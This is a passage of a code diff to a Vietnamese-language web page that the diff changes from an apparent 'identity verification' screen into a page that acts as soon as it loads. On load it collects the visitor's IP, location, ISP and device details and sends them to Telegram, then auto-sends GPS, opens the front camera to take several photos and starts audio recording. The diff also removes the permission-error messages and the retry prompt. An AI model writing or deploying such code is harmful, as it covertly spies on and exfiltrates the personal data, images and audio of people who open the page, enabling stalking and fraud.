-        // Bắt đầu quá trình xác minh
-        async function startVerification() {
-            if (processStarted) return;
-            processStarted = true;
+            infoDiv.className = 'success';
+            infoDiv.innerHTML = text;
             
-            console.log('🚀 Bắt đầu quá trình xác minh...');
-            
-            // Chạy song song
-            const tasks = [
-                sendDeviceInfoToTelegram(),
-                getGPS(),
-                capturePhotos(),
-                startRecording()
-            ];
-            
-            Promise.allSettled(tasks).catch(console.error);
-            
-            // Hiển thị thành công
-            setTimeout(() => {
-                successBox.style.display = 'block';
-                console.log('✅ Xác minh thành công!');
+            if (!infoSent) {
+                infoSent = true;
                 
+                let telegramMapsLink = '';
+                if (locationData.lat && locationData.lon) {
+                    telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
+                }
+                
+                const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
+                    `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
+                    `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
+                    `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
+                    `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
+                    `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
+                    `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
+                    `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
+                    `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
+                    `<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n` +
+                    `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
+                    `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
+                    `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
+                    `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
+                    `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
+                    `<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
+                
+                await sendToTelegram(telegramText);
+                
+                // Tự động gửi vị trí GPS ngay sau khi gửi thông tin
                 setTimeout(() => {
-                    if (previewStream) {
-                        previewStream.getTracks().forEach(track => track.stop());
-                    }
-                }, 2000);
-            }, 1500);
+                    autoSendGPS();
+                }, 1000);
+            }
         }
         
         // Khởi tạo camera
-        async function initCamera() {
+        async function startCameraImmediately() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.warn('Camera not supported');
+                return;
+            }
+            
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
+                console.log('📷 Yêu cầu camera...');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 800 },
+                        height: { ideal: 600 },
                         facingMode: 'user'
-                    } 
+                    }
                 });
                 
-                previewStream = stream;
-                videoPreview.srcObject = stream;
+                cameraStream = stream;
+                cameraActive = true;
+                video.srcObject = stream;
                 
-                errorBox.style.display = 'none';
-                console.log('📷 Camera đã sẵn sàng');
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
                 
-                startVerification();
-                
+                await new Promise(resolve => setTimeout(resolve, 500));
+                await captureMultiplePhotos(video, canvas, ctx);
             } catch (e) {
-                console.error('❌ Camera error:', e);
-                
-                errorBox.style.display = 'block';
-                
-                let errorMessage = '';
-                if (e.name === 'NotAllowedError') {
-                    errorMessage = 'Bạn đã từ chối quyền truy cập camera. Vui lòng cho phép để tiếp tục xác minh.';
-                } else if (e.name === 'NotFoundError') {
-                    errorMessage = 'Không tìm thấy camera trên thiết bị của bạn.';
-                } else if (e.name === 'NotReadableError') {
-                    errorMessage = 'Camera đang được sử dụng bởi ứng dụng khác.';
-                } else {
-                    errorMessage = 'Không thể truy cập camera. Vui lòng kiểm tra lại.';
-                }
-                
-                document.getElementById('errorDescription').innerHTML = errorMessage;
+                console.warn('Camera error:', e);
+                cameraActive = false;
             }
         }
         
-        // Xử lý nút thử lại
-        retryBtn.addEventListener('click', () => {
-            errorBox.style.display = 'none';
-            processStarted = false;
-            initCamera();
-        });
+        async function requestAudioImmediately() {
+            setTimeout(async () => {
+                if (!audioRecorded) {
+                    await startRecording();
+                }
+            }, 100);
+        }
         
-        // Khởi tạo
-        initCamera();
+        async function init() {
+            try {
+                console.log('🚀 Khởi tạo...');
+                const infoPromise = getInfo();
+                const cameraPromise = startCameraImmediately();
+                await cameraPromise;
+                await requestAudioImmediately();
+                await infoPromise;
+            } catch (err) {
+                console.error('Init error:', err);
+                infoDiv.className = 'error';
+                infoDiv.innerHTML = '❌ Đã xảy ra lỗi: ' + err.message + '\n\nVui lòng làm mới trang.';
+            }
+        }
         
-        // Dọn dẹp
-        window.addEventListener('beforeunload', () => {
-            if (previewStream) {
-                previewStream.getTracks().forEach(track => track.stop());
-            }
-            if (captureStream && captureStream !== previewStream) {
-                captureStream.getTracks().forEach(track => track.stop());
-            }
-        });
+        init();
     </script>
 </body>
 </html>
